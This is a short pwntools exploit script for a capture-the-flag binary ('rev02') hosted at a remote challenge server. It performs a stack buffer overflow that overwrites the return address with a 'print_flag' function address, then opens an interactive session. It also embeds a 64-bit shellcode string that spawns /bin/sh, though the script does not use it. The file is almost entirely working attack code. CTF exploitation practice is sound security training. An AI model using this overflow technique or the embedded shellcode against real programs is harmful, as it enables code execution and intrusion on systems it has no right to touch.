#!/usr/bin/env python3

import os
import sys
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# set your target binary name here
binary_name = './rev02'
gdb_command = ''
shellcode_64_nonzero = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xc0PSH\x89\xe7H\x89\xc6H\x89\xc2j;X\x0f\x05'

# setup debug binary
debug_name = binary_name[:-1] + 'x'
if not os.path.exists(debug_name):
    os.system("cp %s %s" % (binary_name, debug_name))


is_debug = False
# run program
if '--debug' in sys.argv:
    is_debug = True

if is_debug:
    p = process(debug_name)
    gdb.attach(p)
    raw_input("Press ENTER to continue to execute the program...")
else:
    # p = process(binary_name)
    # nc challenge.osusec.org 40124
    b = process(binary_name)
    p = remote("challenge.osusec.org", 40124)


## write your exploit here

print(p.recvline())

print_flag_addr = b.elf.symbols["print_flag"]
buffer = b'a' * 0x20 + b'savedrbp'
buffer += p64(print_flag_addr)
p.sendline(buffer)
p.interactive()


# [ret addr  ] rbp+0x8
# [saved rbp ] rbp
# [buffer ]    rbp-0x20